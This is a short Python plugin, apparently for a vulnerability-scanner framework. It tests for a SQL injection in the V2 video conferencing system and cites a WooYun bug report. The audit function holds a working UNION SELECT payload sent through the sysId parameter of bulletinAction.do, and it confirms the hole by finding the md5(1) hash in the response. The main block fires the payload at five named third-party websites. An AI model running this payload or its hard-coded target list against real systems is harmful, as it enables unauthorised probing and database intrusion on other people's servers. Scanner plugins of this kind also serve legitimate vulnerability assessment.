#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:V2视频会议系统某处SQL注射
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0143276

def assign(service,arg):
    if service=="v2_conference":
        return True,arg 
    
def  audit(arg):
    pay="Conf/jsp/systembulletin/bulletinAction.do?operator=details&sysId=-1%20union%20select%201,2,3,md5(1),5%23"
    url=arg+pay
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole('sql :'+url)
        
if __name__=="__main__":
    from dummy import *
    audit(assign('v2_conference','http://yanshi.v2tech.com/')[1])
    audit(assign('v2_conference','http://www.v2meet.cn/')[1])
    audit(assign('v2_conference','http://vc.chinaedu.net/')[1])
    audit(assign('v2_conference','http://meeting.ncw-china.com/')[1])
    audit(assign('v2_conference','http://meeting.liando.cn/')[1])